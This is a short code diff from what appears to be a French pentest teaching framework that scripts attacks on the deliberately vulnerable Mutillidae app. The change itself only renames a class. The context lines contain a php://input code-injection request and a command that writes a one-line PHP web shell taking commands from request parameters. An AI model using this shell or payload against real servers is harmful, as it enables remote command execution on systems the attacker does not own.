@@ -897,7 +897,7 @@ Sur le serveur distant, on trouvera un script similaire a celui-ci, qui aura pou
          $this->article("HackBar","POST <?phpinfo()?>");
          $this->net("http://$this->msf/mutillidae/index.php?page=php://input");
          $this->pause();
-         $vmx = new vm($this->msf);
+         $vmx = new VM($this->msf);
          $this->requette("echo '<?system(\$_REQUEST[cmd])?>' > $this->dir_tmp/shell_php.php ");
          //$this->requette("zip $this->dir_tmp/shell_php.php -d $this->dir_tmp/shell_php.zip ");
          //$vmx->vm2upload("$this->dir_tmp/shell_php.zip", "$this->vm_tmp_lin/shell_php.zip");
